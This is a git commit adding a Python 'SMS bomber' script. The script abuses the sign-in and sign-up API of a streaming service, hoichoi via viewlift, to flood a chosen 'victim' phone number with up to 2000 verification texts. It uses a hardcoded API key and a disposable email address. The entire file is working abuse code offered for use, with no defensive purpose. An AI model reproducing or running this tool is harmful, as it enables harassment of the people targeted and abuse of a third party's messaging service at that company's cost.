6bf42d3f57769836a3895c600324a7b1f1872f6a
AKASH VAI <81800338+VirTuBabA@users.noreply.github.com>
2021-05-12 17:44:06 +0600

    Add files via upload

---
+++ sbomb.py
@@ -0,0 +1,56 @@
+#!/usr/bin/env python3
+#Thanks To Partho
+
+import requests as baba
+print("-----------©️AkashVai❤️---------------")
+print("🔰------------Error71™️--------------🔰")
+"""
+SMS Bomber using Hoichoi SMS api
+"""
+print("❤️-----------Akash Vai----------❤")
+
+def send(target):
+  header = {
+    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
+  }
+
+  data = {
+    "requestType":"send",
+    "phoneNumber":"+88"+target,
+    "screenName":"signin"
+  }
+
+  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
+  res = baba.post(url, json=data, headers=header)
+  if res.json().get("code"):
+    data = {
+      "requestType":"send",
+      "phoneNumber":"+88"+target,
+      "emailConsent":"true",
+      "whatsappConsent":"true",
+      "email":"cicas94417@iconmle.com"
+    }
+    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
+
+    res = baba.post(url, json=data, headers=header)
+    if not res.json().get("sent"): return False
+  return True
+
+def main():
+  target = input("\n\n\n\n\033[1;93m[*] Victim Number: ")
+  amount = int(input("\033[1;96m[*] Threat (Max 2000) : "))
+  sent, nsent = 0, amount
+  for i in range(1, amount + 1):
+    try:
+      if send(target):
+        print(f"[ID: {i}] SMS Sent!")
+        sent += 1
+        nsent -= 1
+      else:
+        print(f"[ID: {i}] SMS Not Sent...")
+    except KeyboardInterrupt: break
+    except Exception as e: print(e); break
+  print(f"\n[*] Total Threat : {amount}\n[+] Sent: {sent}\n[-] Not Sent: {nsent}")
+
+if __name__ == "__main__":
+  main()
